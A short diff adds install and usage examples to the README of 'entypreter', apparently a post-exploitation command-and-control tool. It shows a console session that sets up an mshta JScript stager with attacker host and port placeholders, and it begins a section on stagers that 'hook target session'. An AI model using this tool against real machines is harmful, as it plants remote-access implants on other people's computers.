@@ -8,6 +8,27 @@
    
 ***
 
+# Getting started
+
+> cd entypreter
+
+> chmod +x install.sh
+
+> ./install.sh
+
+***
+
+# The entypreter examples
+
+> entypreter
+
+    (entypreter: sta/js/mshta)# info
+    (entypreter: sta/js/mshta)# set SRVHOST [LHOST]
+    (entypreter: sta/js/mshta)# set SRVPORT [LPORT]
+    (entypreter: sta/js/mshta)# run
+
+***
+
 # Stagers and implants
 
     INFO: Stagers hook target session and 
